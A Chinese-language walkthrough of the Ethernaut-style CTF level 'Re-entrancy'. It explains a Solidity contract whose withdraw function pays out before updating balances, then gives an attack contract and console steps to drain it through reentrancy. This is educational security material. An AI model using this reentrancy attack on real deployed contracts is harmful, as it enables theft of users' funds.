### 第十关 Re-entrancy
### 难度3/5
## 这一关的通关条件是把合约的钱盗走。
## 代码如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
先看代码，该合约主要有四个函数。
1. donate函数，是一个payable修饰的函数，将输入参数地址的balances增加。
2. balanceOf函数，是一个view函数，表示该函数不会改变区块链的状态，只读取数据。这里的作用就是查询地址的余额。
3. withdraw函数，是一个“动账”函数。首先函数判断调用地址的余额是否大于输入的_amount数量，然后使用一个call的低级调用，向调用地址发送_amount数量的eth，如果调用成功，返回true，否则返回false。然后把调用地址的余额给减掉。
4. 一个receive函数，加了payable修饰。
根据合约名以及提示，我们可以知道这关需要利用重入漏洞攻击。在进行转账交易时，应该遵循检测“余额-修改记录-转账”这样的流程，不然有时候会发生一些意想不到的问题，这里的重入攻击便是。所以我们只需要在withdraw函数调用的时候再次调用withdraw就可以在修改balance之前把合约里的钱掏光。
## 解题步骤：
1. 打开remix，写入攻击合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract Attack {

    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function addBalance(uint256 _amount) public {
        IReentrance(levelInstance).withdraw(_amount);
    }

    receive() external payable {
        IReentrance(levelInstance).withdraw(msg.value);
    }
}
```
2. 部署合约，调用level合约里的donate函数，先给我们的地址余额增加不为0，以通过检查。
```Javascript
await contract.donate("攻击合约地址", {value: 不为0即可(单位wei)})
```
4. 调用攻击合约里的addBalance函数，value填入调用donate函数的值,我们的就能重入withdraw函数。
5. 提交过关。
